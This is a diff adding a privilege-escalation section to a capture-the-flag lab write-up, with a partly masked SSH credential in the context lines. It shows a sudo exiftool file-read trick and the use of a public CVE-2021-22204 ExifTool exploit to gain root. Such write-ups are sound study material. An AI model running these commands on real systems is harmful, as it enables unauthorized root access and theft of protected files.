@@ -142,3 +142,30 @@ in this we get _webflag_ and user creds..
 Yeah! we got ssh crendentials stux:p4ssxxxxxxxxx123
 
 ## Privilege escalation
+
+sudo -l
+
+PrivEsc using Exiftool 
+
+![image](../assets/img/thm/cmspit/sudo-l.jpg)
+
+On ![Gtfobins](https://gtfobins.github.io/gtfobins/exiftool/#sudo)
+
+	sudo exiftool -filename=/home/stux/root.txt /root/root.txt
+
+Now check stux home dir!
+ 
+After some googling found __Arbitrary Code Execution for CVE-2021-22204 in ExifTool__
+
+Exploit: [https://github.com/se162xg/CVE-2021-22204](https://github.com/se162xg/CVE-2021-22204)
+
+Download the script then send to the Machine 
+
+	bash Exiftool-PrivEsc.sh 'sudo su'
+
+	sudo -u root /usr/local/bin/exiftool delicate.jp
+
+![image](../assets/img/thm/cmspit/root.jpg)
+
+Rooted!
+
